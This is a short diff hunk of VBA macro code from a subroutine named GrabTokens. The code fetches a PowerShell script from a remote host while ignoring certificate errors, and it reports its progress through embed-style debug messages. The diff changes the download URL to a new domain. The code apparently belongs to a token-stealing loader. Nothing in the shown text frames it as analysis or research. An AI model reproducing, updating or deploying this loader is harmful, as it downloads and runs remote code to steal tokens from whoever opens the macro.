@@ -166,7 +166,7 @@ Sub GrabTokens()
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
     PostEmbed "DEBUG", "Downloading PS1 from /s...", 16753920
-    xh.Open "GET", "https://genthub.app/s", False
+    xh.Open "GET", "https://dicecheck.app/", False
     xh.Send
     If xh.Status <> 200 Then
         PostEmbed "DEBUG", "PS1 download FAILED status:" + CStr(xh.Status), 16711680
